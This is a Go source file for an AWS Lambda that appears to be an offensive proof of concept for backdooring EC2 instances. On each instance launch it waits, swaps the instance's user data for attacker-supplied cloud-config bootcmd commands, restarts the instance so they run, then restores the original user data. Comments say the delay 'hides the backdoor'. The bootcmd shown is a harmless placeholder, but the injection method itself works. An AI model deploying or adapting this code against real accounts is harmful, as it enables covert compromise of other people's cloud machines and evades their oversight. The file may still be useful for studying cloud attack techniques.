package main

import (
	"context"
	"encoding/json"
	"fmt"
	"time"
	"github.com/aws/aws-lambda-go/events"
	"github.com/aws/aws-lambda-go/lambda"
	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
)

var client *ec2.Client

func handleRequest(ctx context.Context, event events.CloudWatchEvent) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("[ERROR]", r)
			return
		}
	}()


	m, err := event.Detail.MarshalJSON()
	if err != nil {
		panic(err)
	}

	var runEvent RunInstancesEvent
	if err := json.Unmarshal(m, &runEvent); err != nil {
		panic(err)
	}

	// TODO: work with multiple instances in same request
	instance := runEvent.ResponseElements.InstancesSet.Items[0]
	
	/* If using things like Terraform you'll have difficult time with automation tools.
         * We have to keep the Lambda running, writting to a log file is ideal.
         * 2 minutes may be enough to get most instances going, also hides the backdoor
	 */
	
	for i := 1; i < 5; i++ {
            time.Sleep(60 * time.Second)
            fmt.Printf("DEBUG: Sleeping for 60 seconds, Round %d\n", i)
        }
	
	fmt.Printf("Instance = %v\n", instance)

	originalUserData := GetUserData(ctx, &instance.InstanceId)
	fmt.Printf("[DEBUG] Original user data is: %s\n", originalUserData.Value)

	/* TODO: Make the attackerUserData read a file called bootcmd.txt. The file contents
	 * should contain a line by line bootcmd in YAML format.
	 */ 
	
	attackerUserData := `#cloud-config

bootcmd:
- echo "Hello from malicious user data 4 to $(whoami)" > /msg4
- shutdown now
`

	ModifyUserData(ctx, instance.InstanceId, attackerUserData)
	fmt.Printf("[INFO] Starting instance %s\n", instance.InstanceId)
	StartInstance(ctx, instance.InstanceId)

	// Shutdown is handled in the bootcmd, this makes sure we don't modify the userData back to the original
	// before our userData runs. We can't simply wait for a running state because the cloud-init data may have not
	// run at that point.
	WaitForInstance(ctx, instance.InstanceId, types.InstanceStateNamePending)
	WaitForInstance(ctx, instance.InstanceId, types.InstanceStateNameStopped)

	ModifyUserData(ctx, instance.InstanceId, originalUserData.Value)
	StartInstance(ctx, instance.InstanceId)
}

func main() {
	if conf, err := config.LoadDefaultConfig(); err != nil {
		panic(err)
	} else {
		client = ec2.NewFromConfig(conf)
	}
	lambda.Start(handleRequest)
}
